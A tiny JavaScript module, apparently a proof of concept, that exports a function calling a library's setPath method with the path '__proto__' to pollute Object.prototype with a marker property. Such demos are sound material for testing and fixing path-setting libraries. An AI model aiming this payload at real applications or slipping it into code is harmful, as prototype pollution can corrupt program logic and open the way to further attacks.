function exploitFunction(obj) {
    if (obj && typeof obj.setPath === 'function') {
        obj.setPath({}, ["__proto__", "polluted"], "yes");
    }
}

module.exports = { exploitFunction };